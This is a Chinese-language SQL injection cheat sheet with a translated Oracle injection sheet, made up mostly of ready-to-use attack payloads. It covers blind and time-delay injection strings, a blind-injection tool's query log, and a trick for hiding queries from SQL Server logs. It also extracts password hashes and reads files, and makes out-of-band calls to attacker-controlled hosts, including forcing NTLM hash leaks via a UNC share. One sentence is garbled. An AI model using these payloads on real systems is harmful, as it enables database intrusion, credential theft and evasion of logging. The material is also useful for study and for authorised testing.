# SQL注入速查表（下）与Oracle注入速查表

一、SQL注入速查表（下）
=============

* * *

### 0x00 目录

1.  盲注
    1.  关于盲注
    2.  实战中的盲注实例
2.  延时盲注
    1.  `WAITFOR DELAY [time]`(S)
    2.  实例
    3.  `BENCHMARK()`(M)
    4.  实例
    5.  `pg_sleep(seconds)`(P)
3.  掩盖痕迹
    1.  `-sp_password log bypass`(S)
4.  注入测试
5.  一些其他的MySQL笔记
    1.  MySQL中好用的函数
6.  SQL注入的高级使用
    1.  强制SQL Server来得到NTLM哈希
    2.  Bulk insert UNC共享文件 (S)

### 0x01 盲注

#### 关于盲注

一个经过完整而优秀开发的应用一般来说你是**看不到错误提示的**，所以你是没办法从`Union`攻击和错误中提取出数据的

**一般盲注**，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果

**完全盲注**，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。

在一般盲注下你能够使用**If语句**或者**WHERE查询注入\***|(一般来说比较简单)*，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在`SQL Server`中你需要使用`WAIT FOR DELAY '0:0:10'`，在MySQL中使用`BENCHMARK()`，在`PostgreSQL`中使用`pg_sleep(10)`，以及在`ORACLE`中的一些`PL/SQL小技巧`。

#### 实战中的盲注实例

以下的输出来自一个真实的私人盲注工具在测试一个`SQL Server`后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。

**TRUE**和**FALSE**标志代表了查询返回了`true`或`false`

```
TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 


FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)

```

由于上面**后两个查询都是false**，我们能清楚的知道表名的第一个**字符的ASCII码是80，也就是"P"**。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(`bit by bit`)地读取数据。这些方法在不同条件下都很有效。

### 延时盲注

首先，只在完全没有提示(`really blind`)的情况下使用，否则请使用`1/0方式`通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(`timeout`)。

#### WAITFOR DELAY[time](http://drops.com:8000/S)

这就跟`sleep`差不多，等待特定的时间。通过CPU来让数据库进行等待。

```
WAITFOR DELAY '0:0:10'--

```

你也可以这样用

```
WAITFOR DELAY '0:0:0.51'

```

#### 实例

*   俺是sa吗？`if (select user) = 'sa' waitfor delay '0:0:10'`
*   ProductID =`1;waitfor delay '0:0:10'--`
*   ProductID =`1);waitfor delay '0:0:10'--`
*   ProductID =`1';waitfor delay '0:0:10'--`
*   ProductID =`1');waitfor delay '0:0:10'--`
*   ProductID =`1));waitfor delay '0:0:10'--`
*   ProductID =`1'));waitfor delay '0:0:10'--`

#### BENCHMARK()(M)

一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。

```
BENCHMARK(howmanytimes, do this)

```

#### 实例

*   俺是root吗？爽！`IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))`
    
*   判断表是否存在`IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))`
    

#### pg_sleep(seconds)(P)

睡眠指定秒数。

*   `SELECT pg_sleep(10);`睡个十秒

### 掩盖痕迹

#### -sp_password log bypass(S)

出于安全原因，`SQL Server`不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。

### 0x02 注入测试

这些测试既简单又清晰，适用于盲注和悄悄地搞。

1.  `product.asp?id=4 (SMO)`
    
    1.  `product.asp?id=5-1`
    2.  `product.asp?id=4 OR 1=1`
2.  `product.asp?name=Book`
    
    1.  `product.asp?name=Bo’%2b’ok`
    2.  `product.asp?name=Bo’ || ’ok (OM)`
    3.  `product.asp?name=Book’ OR ‘x’=’x`

### 0x03 一些其他的MySQL笔记

*   子查询只能在MySQL4.1+使用
*   用户
    *   `SELECT User,Password FROM mysql.user;`
*   `SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;`
*   `SELECT ... INTO DUMPFILE`
    *   把查询写入一个**新文件**中(不能修改已有文件)
*   UDF功能
    *   `create function LockWorkStation returns integer soname 'user32';`
    *   `select LockWorkStation();`
    *   `create function ExitProcess returns integer soname 'kernel32';`
    *   `select exitprocess();`
*   `SELECT USER();`
*   `SELECT password,USER() FROM mysql.user;`
*   admin密码哈希的第一位
    
    *   `SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;`
*   文件读取
    
    *   `query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`
*   MySQL读取文件内容
    
    *   **默认这个功能是没开启的！**
        
        ```
        create table foo( line blob ); 
        load data infile 'c:/boot.ini' into table foo; 
        select * from foo;
        
        ```
*   MySQL里的各种延时
    
*   `select benchmark( 500000, sha1( 'test' ) ); query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`
    
*   `select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );`
    
*   **遍历数据，暴力猜解**
    *   `select if( (ascii(substring(user(),1,1)) >> 7) & 1,benchmark(100000,sha1('test')), 'false' );`

#### MySQL中好用的函数

*   `MD5()`
    
    MD5哈希
    
*   `SHA1()`
    
    SHA1哈希
    
*   `PASSWORD()`
    
*   `ENCODE()`
    
*   `COMPRESS()`
    
    压缩数据，在盲注时读取大量数据很好用
    
*   `ROW_COUNT()`
    
*   `SCHEMA()`
    
*   `VERSION()`
    
    跟`@@version`是一样的
    

### SQL注入的高级使用

一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）

> Name:`' + (SELECT TOP 1 password FROM users ) + '`
> 
> Email :`xx@xx.com`

[[email protected]](http://drops.com:8000/cdn-cgi/l/email-protection)骤，之后它就会把第一个用户的密码写进你的name里面。

#### 强制SQL Server来得到NTLM哈希

这个攻击能够帮助你得到目标`SQL`服务器的`Window`s密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的`WindowsUNC`共享并通过抓包软件(`Cain & Abel`)捕捉`NTLM session`。

#### Bulk insert UNC共享文件 (S)

`bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'`

二、Oracle注入速查表
=============

本文由Yinzo翻译，转载请保留署名。原文地址：[http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)

注：下面的一部分查询只能由admin执行，我会在查询的末尾以"**`-priv`**"标注。

探测版本：

```
SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
SELECT version FROM v$instance;

```

注释：

```
SELECT 1 FROM dual — comment

```

_注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’_

当前用户：

```
SELECT user FROM dual

```

列出所有用户：

```
SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$; — priv

```

列出密码哈希：

```
SELECT name, password, astatus FROM sys.user$ — priv, <= 10g.  astatus能够在acct被锁定的状态下给你反馈
SELECT name,spare4 FROM sys.user$ — priv, 11g

```

密码破解：

[checkpwd](http://www.red-database-security.com/software/checkpwd.html)能够把Oracle8,9,10的基于DES的哈希破解掉

列出权限：

```
SELECT * FROM session_privs; —当前用户的权限
SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;

```

列出DBA账户：

```
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限

```

当前数据库：

```
SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;

```

列出数据库：

```
SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)

```

– 通过查询TNS监听程序能够查询到其他数据库.详情看[tnscmd](http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html)。

列出字段名：

```
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;

```

列出表名：

```
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;

```

通过字段名找到对应表：

```
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  

```

— 注: 表名都是大写

查询第N行：

```
SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)

```

查询第N个字符：

```
SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’

```

按位与(`Bitwise AND`)：

```
SELECT bitand(6,2) FROM dual; — 返回2
SELECT bitand(6,1) FROM dual; — 返回0

```

ASCII值转字符：

```
SELECT chr(65) FROM dual; — 返回A

```

字符转ASCII码：

```
SELECT ascii(‘A’) FROM dual; — 返回65

```

类型转换：

```
SELECT CAST(1 AS char) FROM dual;
SELECT CAST(’1′ AS int) FROM dual;

```

拼接字符：

```
SELECT ‘A’ || ‘B’ FROM dual; — 返回AB

```

IF语句：

```
BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 

```

— 跟`SELECT`语句在一起时不太管用

`Case`语句：

```
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2

```

绕过引号：

```
SELECT chr(65) || chr(66) FROM dual; — 返回AB

```

延时：

```
BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢

```

— 更多关于延时的内容请看[Heavy Queries](http://technet.microsoft.com/en-us/library/cc512676.aspx)

发送DNS请求：

```
SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;

```

命令执行：

如果目标机装了JAVA就能执行命令，[看这里](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql)

有时候ExtProc也可以，不过我一般都成功不了，[看这里](http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql)

本地文件读取：

[UTL_FILE](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql)有时候能用。如果下面的语句没有返回null就行。

```
SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;

```

[JAVA](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql)能用来读取和写入文件，除了`Oracle Express`

主机名称、IP地址：

```
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称

```

定位DB文件：

```
SELECT name FROM V$DATAFILE;

```

默认系统和数据库：

```
SYSTEM
SYSAUX

```

### 额外小贴士：

一个字符串列出所有表名：

```
select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,') from all_tables 

```

– 当你union联查注入的时候只有一行能用与返回数据时使用

盲注排序：

```
order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 

```

— 你必须知道两个拥有相同数据类型的字段名才能用

译者注：`Oracle`注入速查表的作者这边还有`MSSQL`、`MySQL`、`PostgreSQL`、`Ingres`、`DB2`、`Informix`等数据库的速查表，不过我看Drops里面`MSSQL`和`MySQL`都已经有比较好的文章了，所以如果有需求的话请在评论留言。